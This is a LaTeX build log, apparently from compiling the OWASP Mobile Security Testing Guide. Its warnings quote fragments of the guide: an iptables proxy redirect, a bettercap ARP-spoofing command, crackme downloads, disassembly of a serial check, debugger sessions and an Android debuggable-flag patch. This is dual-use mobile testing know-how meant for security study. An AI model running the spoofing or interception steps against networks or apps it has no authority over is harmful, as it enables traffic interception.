[]\TU/SourceCodePro(6)/m/n/10.95 04:54:06.590751 00:9e:1e:10:7f:69 (oui Unknown
) > Broadcast, RRCP-0x23 reply[] 

Overfull \hbox (14.51942pt too wide) in paragraph at lines 11715--11715
[]\TU/SourceCodePro(6)/m/n/10.95 04:54:09.659658 00:9e:1e:10:7f:69 (oui Unknown
) > Broadcast, RRCP-0x23 reply[] 

Overfull \hbox (14.51942pt too wide) in paragraph at lines 11715--11715
[]\TU/SourceCodePro(6)/m/n/10.95 04:54:10.579795 00:9e:1e:10:7f:69 (oui Unknown
) > Broadcast, RRCP-0x23 reply[] 
[201]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d900623abe71b16708fe18ac2b6f64bad8a52940.
png" > [202]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7f691aaaf6ec47de147328a7a97e7bc6d8783ba2.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/16c05811ca4e956a31e4a7bb5b376b9395fa16e7.
png" > [203] [204]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2e818595a18a1cfbf5f33ff73d6c378862712b89.
png" > [205]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/9cdb0f9a684dd8350455778005a9452a8ce54d1f.
png" > [206]
Overfull \hbox (7.0698pt too wide) in paragraph at lines 12016--12027
[]\TU/SourceSansPro(0)/m/n/10.95 Some application (e.g. the [][]Chrome browser[
][]) may show \TU/SourceCodePro(6)/m/n/10.95 NET::ERR_CERT_VALIDITY_TOO_LONG
[207] [208] [209] [210] [211] [212]
Overfull \hbox (8.78668pt too wide) in paragraph at lines 12368--12370
[]\TU/SourceSansPro(0)/m/n/10.95 For both solutions you need to activate “Suppo
rt invisible proxying” in Burp, in Proxy Tab/Options/Edit

Overfull \hbox (99.9294pt too wide) in paragraph at lines 12380--12380
[]\TU/SourceCodePro(6)/m/n/10.95 $ iptables -t nat -A OUTPUT -p tcp --dport 80 
-j DNAT --to-destination <Your-Proxy-IP>:8080[] 

Overfull \hbox (88.97955pt too wide) in paragraph at lines 12404--12404
[]\TU/SourceCodePro(6)/m/n/10.95 DNAT       tcp  --  anywhere             anywh
ere             tcp dpt:5288 to:<Your-Proxy-IP>:8080[] 
[213]
Overfull \hbox (347.39938pt too wide) in paragraph at lines 12430--12430
[]\TU/SourceCodePro(6)/m/n/10.95 $ sudo bettercap -eval "set arp.spoof.targets 
X.X.X.X; arp.spoof on; set arp.spoof.internal true; set arp.spoof.fullduplex tr
ue;"[] 

Overfull \hbox (97.73944pt too wide) in paragraph at lines 12430--12430
[]\TU/SourceCodePro(6)/m/n/10.95 bettercap v2.22 (built for darwin amd64 with g
o1.12.1) [type []help[] for a list of commands][] 

Overfull \hbox (10.13943pt too wide) in paragraph at lines 12430--12430
[]\TU/SourceCodePro(6)/m/n/10.95 [19:21:39] [sys.log] [inf] arp.spoof arp spoof
er started, probing 1 targets.[] 
[214]
Underfull \hbox (badness 10000) in paragraph at lines 12495--12498
[]\TU/SourceSansPro(0)/m/n/10.95 Basic Network Security Configuration - [][]$[]
[][][][] [] [] [] [][][][][][][][] [] [][][][][][][][][][] [] [][][][][][] [] [
][][] [] [][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 12498--12502
[][][] [] [][][][] [] [][][][] [] [][] [] [][] [] [] [][] [][][][][][][][] [][]
 [][][][][][][][] [][] [][][][][] [][] [][] [][] [][][][][][][] [][] [][][][][]
[][][] [][] [][][][][][][][][][][][][] [][] [][] [][] [][][][][][][] [][]

Underfull \hbox (badness 4543) in paragraph at lines 12526--12529
[]\TU/SourceSansPro(0)/m/n/10.95 SharedPreferences APIs - [][]$[][][][][] [] []
 [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][] [] [][][
][][][] [] [][][][] [][] [][][][][][][] [] [][][][][][] [][]
[215]
Underfull \hbox (badness 4217) in paragraph at lines 12552--12555
[]\TU/SourceSansPro(0)/m/n/10.95 Android NDK Downloads - [][]$[][][][][] [] [] 
[] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][] [] [][][][][][][][]
[] [] [][][][][] [] [][][][] [] [][][][][][] [][]
[216] [217]
Underfull \hbox (badness 1968) in paragraph at lines 12721--12733
\TU/SourceSansPro(0)/m/n/10.95 readable. Fortunately, Java decompilers generall
y handle Android bytecode well. Popular free
[218] [219]
Overfull \hbox (196.28934pt too wide) in paragraph at lines 12839--12839
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://github.com/OWASP/owasp-mstg/raw
/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b7218223963e160bb23b8740d81da1ec9ba40306.
png" > [220] [221]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6dcc613ab62a7f54560f516bce94dc562a5ec576.
jpg" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/576f6aa1d427f2ec67695539e120520535f6d392.
jpg" > [222]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8ff26bdbf1d75df81f76e8179d0c8eaa03841b67.
jpg" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/479365e620ef5d468ce30bee9120b9223109e90f.
jpg" > [223] [224]
Overfull \hbox (215.99933pt too wide) in paragraph at lines 13011--13011
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://github.com/OWASP/owasp-mstg/raw
/master/Samples/Android/01_HelloWorld-JNI/HelloWord-JNI.apk[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8e08bca1d4ad633b71205ea22c4c17cafa6cd2bb.
png" > [225]
Overfull \hbox (69.5245pt too wide) in paragraph at lines 13054--13054
\TU/SourceCodePro(6)/m/n/10 ((TextView)[]\TU/SourceCodePro(6)/bx/n/10 this[]\TU
/SourceCodePro(6)/m/n/10 .[]findViewById[]([]2131427422[])).[]setText[]((CharSe
quence)[]\TU/SourceCodePro(6)/bx/n/10 this[]\TU/SourceCodePro(6)/m/n/10 .[]stri
ngFromJNI[]());|  

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/9fc57a40d76503de64f69b4bd6de61b4ccf8932f.
jpg" > [226]
Overfull \hbox (205.04945pt too wide) in paragraph at lines 13103--13103
[]     \TU/SourceCodePro(6)/m/n/10.95 3: 00004e49   112 FUNC    GLOBAL DEFAULT 
  11 Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI[] 

Overfull \hbox (205.04936pt too wide) in paragraph at lines 13110--13110
[]\TU/SourceCodePro(6)/m/n/10.95 003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 J
ava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI[] 
[227]
Overfull \hbox (76.03288pt too wide) in paragraph at lines 13153--13159
[]\TU/SourceSansPro(0)/m/n/10.95 To open the file in radare2 you only have to r
un \TU/SourceCodePro(6)/m/n/10.95 r2 -A HelloWord-JNI/lib/armeabi-v7a/libnative
-lib.so\TU/SourceSansPro(0)/m/n/10.95 .
[228] [229]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8f8c639e93e6960d7f50c243f52229fc18cdcde3.
jpg" > [230]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8de449706bf63265be48bd835aa227612a1e921f.
png" > [231]
Underfull \hbox (badness 2884) in paragraph at lines 13348--13357
\TU/SourceSansPro(0)/m/n/10.95 such as Ghidra or Cutter or rely on CLI-based to
ols such as the \TU/SourceSansPro(0)/m/it/10.95 strings \TU/SourceSansPro(0)/m/
n/10.95 Unix utility (\TU/SourceCodePro(6)/m/n/10.95 strings
[232] [233]
Overfull \hbox (38.26028pt too wide) in paragraph at lines 13474--13482
\TU/SourceSansPro(0)/m/n/10.95 along is a good practice. Open the \TU/SourceCod
ePro(6)/m/n/10.95 MainActivity \TU/SourceSansPro(0)/m/n/10.95 class in the pack
age \TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.uncrackable1\TU/SourceSansPr
o(0)/m/n/10.95 .

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/89f4493dc543c8aac3d5832072600f0f501870e7.
jpg" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ceae72251f9dfa7c124c9f3ddaaf620a54091696.
jpg" > [234]
Overfull \hbox (15.5245pt too wide) in paragraph at lines 13515--13515
\TU/SourceCodePro(6)/m/n/10 Base64.[]decode[]((String)[]"5UJiFctbmgbDoLXmpL12mk
no8HT4Lv8dlat8FxR2GOc="[], 

Overfull \hbox (29.02097pt too wide) in paragraph at lines 13532--13538
[]\TU/SourceSansPro(0)/m/n/10.95 So, you have a Base64-encoded String that’s pa
ssed to the function \TU/SourceCodePro(6)/m/n/10.95 a \TU/SourceSansPro(0)/m/n/
10.95 in the package \TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.a.a
[235]
Overfull \hbox (205.04936pt too wide) in paragraph at lines 13583--13583
[]\TU/SourceCodePro(6)/m/n/10.95 003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 J
ava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI[] 

Overfull \hbox (23.27937pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 ╭ (fcn) sym.Java_sg_vantagepoint_helloworldjni
_MainActivity_stringFromJNI 12[] 

Overfull \hbox (78.02936pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 │   sym.Java_sg_vantagepoint_helloworldjni_Mai
nActivity_stringFromJNI (int32_t arg1);[] 

Overfull \hbox (124.01958pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e7a      0249           ldr
 r1, aav.0x00000f3c      ; [0xe84:4]=0xf3c aav.0x00000f3c[] 

Overfull \hbox (106.49966pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e80      7944           add
 r1, pc                  ; "Hello from C++" section..rodata[] 
[236]
Overfull \hbox (134.96938pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 $ r2 -qc []e emu.str=true; s 0x00000e78; af; p
df[] HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so[] 

Overfull \hbox (23.27937pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 ╭ (fcn) sym.Java_sg_vantagepoint_helloworldjni
_MainActivity_stringFromJNI 12[] 

Overfull \hbox (78.02936pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 │   sym.Java_sg_vantagepoint_helloworldjni_Mai
nActivity_stringFromJNI (int32_t arg1);[] 

Overfull \hbox (23.2796pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e7a      0249           ldr
 r1, [0x00000e84]        ; [0xe84:4]=0xf3c[] 

Overfull \hbox (106.49966pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e80      7944           add
 r1, pc                  ; "Hello from C++" section..rodata[] 

Overfull \hbox (174.74588pt too wide) in paragraph at lines 13652--13661
\TU/SourceSansPro(0)/m/n/10.95 dialog. Enter “java” and hit enter. This should 
highlight the \TU/SourceCodePro(6)/m/n/10.95 Java_sg_vantagepoint_helloworld_Ma
inActivity_stringFromJNI

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/863e10b9775e05477765e9cefdc94ea46693a266.
jpg" > [237]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c96d983d30cbabc7d3d5c2c7951de81c61d650c5.
png" > [238]
Overfull \hbox (190.5771pt too wide) in paragraph at lines 13740--13751
\TU/SourceSansPro(0)/m/n/10.95 fined functions: \TU/SourceCodePro(6)/m/n/10.95 
FUN_001004d0\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 FUN
_0010051c\TU/SourceSansPro(0)/m/n/10.95 , and \TU/SourceCodePro(6)/m/n/10.95 Ja
va_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI\TU/SourceSansPro(0)
/m/n/10.95 .

Overfull \hbox (71.98134pt too wide) in paragraph at lines 13740--13751
\TU/SourceSansPro(0)/m/n/10.95 The instructions in the function \TU/SourceCodeP
ro(6)/m/n/10.95 Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a910215ed46dba7e8f1cef010443d3ffce923f4a.
png" > [239] [240] [241]
Overfull \hbox (139.3496pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  txt       REG     
        259,11     23968        399 /system/bin/app_process64[] 

Overfull \hbox (299.21967pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  mem   unknown     
                                    /dev/ashmem/dalvik-main space (region space
) (deleted)[] 

Overfull \hbox (314.54955pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  mem       REG     
         253,0   2797568    1146914 /data/dalvik-cache/arm64/system@framework@b
oot.art[] 

Overfull \hbox (393.38951pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  mem       REG     
         253,0   1081344    1146915 /data/dalvik-cache/arm64/system@framework@b
oot-core-libart.art[] 
[242]
Overfull \hbox (30.91528pt too wide) in paragraph at lines 13943--13949
[]\TU/SourceSansPro(0)/m/n/10.95 You can find system-wide networking informatio
n in \TU/SourceCodePro(6)/m/n/10.95 /proc/net \TU/SourceSansPro(0)/m/n/10.95 or
 just by inspecting the \TU/SourceCodePro(6)/m/n/10.95 /proc/<pid>/net

Overfull \hbox (110.87944pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 sl  local_address rem_address   st tx_queue rx
_queue tr tm->when retrnsmt   uid  timeout inode[] 

Overfull \hbox (314.54942pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 69: 1101A8C0:BB2F 9A447D4A:01BB 01 00000000:00
000000 00:00000000 00000000 10093        0 75412 1 0000000000000000 20 3 19 10 
-1[] 

Overfull \hbox (314.54942pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 70: 1101A8C0:917C E3CB3AD8:01BB 01 00000000:00
000000 00:00000000 00000000 10093        0 75553 1 0000000000000000 20 3 23 10 
-1[] 

Overfull \hbox (314.54942pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 71: 1101A8C0:C1E3 9C187D4A:01BB 01 00000000:00
000000 00:00000000 00000000 10093        0 75458 1 0000000000000000 20 3 19 10 
-1[] 

Overfull \hbox (88.97958pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 Proto Recv-Q Send-Q Local Address           Fo
reign Address         State       PID/Program Name[] 

Overfull \hbox (209.42949pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:47368      17
2.217.194.103:https   CLOSE_WAIT  24685/com.google.android.youtube[] 

Overfull \hbox (207.23949pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:47233      17
2.217.194.94:https    CLOSE_WAIT  24685/com.google.android.youtube[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:38480      sc
-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube[] 

Overfull \hbox (205.0495pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:44833      74
.125.24.91:https      ESTABLISHED 24685/com.google.android.youtube[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:38481      sc
-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube[] 
[243]
Overfull \hbox (281.69955pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 12c00000-52c00000 rw-p 00000000 00:04 14917   
                           /dev/ashmem/dalvik-main space (region space) (delete
d)[] 

Overfull \hbox (268.55952pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 6f019000-6f2c0000 rw-p 00000000 fd:00 1146914 
                           /data/dalvik-cache/arm64/system@framework@boot.art[]
 

Overfull \hbox (454.70943pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 7327670000-7329747000 r--p 00000000 fd:00 1884
627                        /data/app/com.google.android.gms-4FJbDh-oZv-5bCw39jk
IMQ==/oat/arm64/base.odex[] 

Overfull \hbox (579.53937pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 733494d000-7334cfb000 r-xp 00000000 fd:00 1884
542                        /data/app/com.google.android.youtube-Rl_hl9LptFQf3Vf
-JJReGw==/lib/arm64/libcronet.80.0.3970.3.so[] 

Overfull \hbox (13.20181pt too wide) in paragraph at lines 14033--14038
[]\TU/SourceSansPro(0)/m/n/10.95 The application data is stored in a sandboxed 
directory present at \TU/SourceCodePro(6)/m/n/10.95 /data/data/<app_package_nam
e>\TU/SourceSansPro(0)/m/n/10.95 .
[244] [245]
Overfull \hbox (24.42918pt too wide) in paragraph at lines 14141--14149
[]\TU/SourceSansPro(0)/m/n/10.95 Review the code and you’ll see that the method
 \TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.uncrackable1.MainActivity.a
[246]
Overfull \hbox (64.88939pt too wide) in paragraph at lines 14175--14175
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", android.app.Dia
log.setCancelable(), line=1,110 bci=0[] 

Overfull \hbox (64.88939pt too wide) in paragraph at lines 14197--14197
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", android.app.Dia
log.setCancelable(), line=1,110 bci=0[] 
[247] [248]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e72654a6a7c90c6599aa37ed6e7a31b0b4a8953c.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d706835a0a613f7a1c3657d0e4f6cef4a1eb2fd4.
png" > [249]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/06ba7913ac1a2b0a4aa6772f5a46f958090cfcf4.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/88882390b46ffa938d25cc2171b9d17ae601e321.
png" > [250]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f6aca067d3cb055ccf6710f43ba1803d1c3cb9f6.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f6aca067d3cb055ccf6710f43ba1803d1c3cb9f6.
png" > [251]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/be767c8387e4fa818e0d2472725ba354bbed9963.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/41267d580ddfdde69914ed30df95961c12bcccd2.
png" > [252]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2227ece3978c331f17f61ab16971637b28978e2b.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/436e8051f1cc1455cba06b72c3b43af389e741a0.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/355be076b7f1150d56bfc6db6f006e480d86342c.
png" > [253]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6fb02bb0034224ded58a891172cdf90fac1b99c2.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e25a98359ba7bd5a62406e7235ab1a6aa4d784e1.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6b6d5a67bd3b76357dc552be5af26f9719a0a5d2.
png" > [254]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1335eef4fd499e31b736d73fe8df57f38edc11a2.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d0f6dbdba327db2d0324dd91e49a89bfbca238ff.
png" > [255]
Overfull \hbox (62.69943pt too wide) in paragraph at lines 14488--14488
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a164   12690 201   1533400 51692 ffffffff 0
0000000 S sg.vantagepoint.helloworldjni[] 
[256]
Overfull \hbox (16.70944pt too wide) in paragraph at lines 14510--14510
[]\TU/SourceCodePro(6)/m/n/10.95 Reading symbols from libnative-lib.so...(no de
bugging symbols found)...done.[] 

Overfull \hbox (280.79056pt too wide) in paragraph at lines 14521--14529
[]\TU/SourceSansPro(0)/m/n/10.95 Our objective is to set a breakpoint at the fi
rst instruction of the native function \TU/SourceCodePro(6)/m/n/10.95 Java_sg_v
antagepoint_helloworldjni_MainActivity_stringFromJNI

Underfull \hbox (badness 2245) in paragraph at lines 14541--14548
\TU/SourceSansPro(0)/m/n/10.95 point at the \TU/SourceCodePro(6)/m/n/10.95 java
.lang.System.loadLibrary \TU/SourceSansPro(0)/m/n/10.95 method and resume the p
rocess. After the

Overfull \hbox (25.46939pt too wide) in paragraph at lines 14560--14560
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", java.lang.Syste
m.loadLibrary(), line=988 bci=0[] 

Overfull \hbox (170.00935pt too wide) in paragraph at lines 14560--14560
[]\TU/SourceCodePro(6)/m/n/10.95 Step completed: "thread=main", sg.vantagepoint
.helloworldjni.MainActivity.<clinit>(), line=12 bci=5[] 
[257]
Overfull \hbox (10.1394pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 > stop in com.acme.bob.mobile.android.core.Bob
MobileApplication.<clinit>()[] 

Overfull \hbox (91.16939pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 Deferring breakpoint com.acme.bob.mobile.andro
id.core.BobMobileApplication.<clinit>().[] 

Overfull \hbox (102.11937pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 Set deferred breakpoint com.acme.bob.mobile.an
droid.core.BobMobileApplication.<clinit>()[] 
[258]
Overfull \hbox (242.27934pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", com.acme.bob.mo
bile.android.core.BobMobileApplication.<clinit>(), line=44 bci=0[] 
[259]
Overfull \hbox (393.38942pt too wide) in paragraph at lines 14676--14676
[]\TU/SourceCodePro(6)/m/n/10.95 $ while true; do pid=$(pgrep []target_process[
] | head -1); if [[ -n "$pid" ]]; then strace -s 2000 - e "!read" -ff -p "$pid"
; break; fi; done[] 
[260]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/edb98d4210c76f2964570cb2d22ab456c3330ccb.
png" > [261] [262] [263]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/fb1b26788aead664e5a0f41c958b592f8669d389.
png" > [264]
Overfull \hbox (294.83939pt too wide) in paragraph at lines 14947--14947
[]\TU/SourceCodePro(6)/m/n/10.95 $ emulator -show-kernel -avd Nexus_4_API_19 -s
napshot default-boot -no-snapshot-save -qemu -d in_asm,cpu 2>/tmp/qemu.log[] 
[265] [266]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/43b2caf15e7d55029ae04597beb74c2ca7c74342.
png" >
Underfull \hbox (badness 10000) in paragraph at lines 15093--15095
[][] \TU/SourceSansPro(0)/m/n/10.95 Disassem-
[267]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a9a7d2d1f4cd59ad389154d6c3aae7dad92f39e7.
png" > [268]
Underfull \hbox (badness 1715) in paragraph at lines 15109--15117
[]\TU/SourceCodePro(6)/m/n/10.95 strlen \TU/SourceSansPro(0)/m/n/10.95 is calle
d at offset \TU/SourceCodePro(6)/m/n/10.95 0x000018a8\TU/SourceSansPro(0)/m/n/1
0.95 , and the returned value is compared to 0x10 at offset
[269]
Overfull \hbox (18.89967pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x0000176c      str r0, [var_20h] 
                         ; 0x20 ; "$!" ; arg1[] 

Overfull \hbox (84.59966pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00001770      ldr r3, [var_20h] 
                         ; 0x20 ; "$!" ; entry.preinit0[] 

Overfull \hbox (47.36964pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎│   0x000017a4      ldr r1, [var_14h] 
                         ; 0x14 ; entry.preinit0[] 

Overfull \hbox (121.82964pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎│   0x000017bc      add r3, r3, 2     
                         ; "ELF\x01\x01\x01" ; aav.0x00000001[] 

Overfull \hbox (47.36964pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎│   0x000017c4      ldr r3, [var_14h] 
                         ; 0x14 ; entry.preinit0[] 

Overfull \hbox (51.74962pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎╰─> 0x000017d0      ldr r3, [var_14h] 
                         ; 0x14 ; entry.preinit0[] 

Overfull \hbox (200.66965pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎    0x000017d4      cmp r3, 4         
                         ; aav.0x00000004 ; aav.0x00000001 ; aav.0x00000001[] 
[270]
Overfull \hbox (222.56955pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x00001840      ldr r3, [0x0000186
c]                       ; [0x186c:4]=0x270 section..hash ; section..hash[] 

Overfull \hbox (255.41959pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x00001844      add r3, pc, r3    
                         ; 0x1abc ; "Product activation passed. Congratulations
!"[] 

Overfull \hbox (259.7996pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x00001848      mov r0, r3        
                         ; 0x1abc ; "Product activation passed. Congratulations
!" ;[] 

Overfull \hbox (62.69963pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x0000184c      bl sym.imp.puts   
                         ; int puts(const char *s)[] 

Overfull \hbox (218.18974pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││                                     
                         ; int puts("Product activation passed. Congratulations
!")[] 

Overfull \hbox (45.17941pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  ││││││   ; CODE XREFS from fcn.00001760 (0x
17ec, 0x1800, 0x1814, 0x1828, 0x183c)[] 

Overfull \hbox (139.34955pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │╰╰╰╰╰─> 0x00001854      ldr r3, aav.0x0000
0288                     ; [0x1870:4]=0x288 aav.0x00000288[] 

Overfull \hbox (91.16963pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │        0x00001858      add r3, pc, r3    
                         ; 0x1ae8 ; "Incorrect serial." ;[] 

Overfull \hbox (84.59966pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │        0x0000185c      mov r0, r3        
                         ; 0x1ae8 ; "Incorrect serial." ;[] 

Overfull \hbox (53.93965pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │        0x00001860      bl sym.imp.puts   
                         ; int puts(const char *s)[] 

Overfull \hbox (42.98979pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │                                          
                         ; int puts("Incorrect serial.")[] 
[271]
Overfull \hbox (115.25963pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 ╰           0x00001868      pop {r4, fp, pc}  
                         ; entry.preinit0 ; entry.preinit0 ;[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/196e63531f9e462f1ab15205845fe2749b783d26.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/444928658f8dea94b4ec067294cc7379daec0908.
png" > [272]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ece45f74f3b110d8097107d86ef4cda57625332a.
png" > [273] [274]
Overfull \hbox (7.94942pt too wide) in paragraph at lines 15369--15369
[]\TU/SourceCodePro(6)/m/n/10.95 WARNING | cle.loader | The main binary is a po
sition-independent executable.[] 
[275] [276]
Overfull \hbox (124.01938pt too wide) in paragraph at lines 15480--15480
[]\TU/SourceCodePro(6)/m/n/10.95 .method public checkServerTrusted([LJava/secur
ity/cert/X509Certificate;Ljava/lang/String;)V[] 

Overfull \hbox (21.08939pt too wide) in paragraph at lines 15480--15480
[]  \TU/SourceCodePro(6)/m/n/10.95 invoke-virtual {v1}, Ljava/util/ArrayList;->
iterator()Ljava/util/Iterator;[] 
[277]
Underfull \hbox (badness 1147) in paragraph at lines 15505--15511
\TU/SourceSansPro(0)/m/n/10.95 ifest file (AndroidManifest.xml). Once you’ve un
packed the app (e.g. \TU/SourceCodePro(6)/m/n/10.95 apktool d --no-src

Overfull \hbox (21.11864pt too wide) in paragraph at lines 15505--15511
\TU/SourceCodePro(6)/m/n/10.95 UnCrackable-Level1.apk\TU/SourceSansPro(0)/m/n/1
0.95 ) and decoded the Android Manifest, add \TU/SourceCodePro(6)/m/n/10.95 and
roid:debuggable="true"

